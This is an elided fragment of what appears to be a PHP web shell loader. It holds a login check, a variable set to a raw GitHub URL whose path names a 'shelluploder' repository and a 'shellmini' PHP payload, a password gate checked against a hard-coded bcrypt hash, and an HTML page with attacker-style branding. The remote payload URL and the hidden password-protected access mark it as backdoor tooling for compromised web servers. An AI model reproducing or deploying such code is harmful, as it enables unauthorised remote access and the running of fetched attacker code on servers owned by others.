...
if (is_logged_in()) {
    ...
    $b0rn = 'https://raw.githubusercontent.com/Kisah899123/shelluploder/refs/heads/main/shellmini/artisan.php';
    ...
    if (isset($_POST['password'])) { 
        ...
        $hashed_key = '$2y$10$zfcoIUTfPl6htD4FsVXhO.ZjIVtPf0K7V9WeOxDVgwVW5K7dwQczO'; // https://bcrypt.online/ 
...
<html lang="en">
  <head>
    ...
    <link rel="icon" href="https://i.imgur.com/LeCyWoz.png">
  ...
  <body>
    <div class="container">
      <img id="clickableImage" src="https://i.imgur.com/LeCyWoz.png" width="300px" alt="Corrupted Unorthodox Catastrophe">
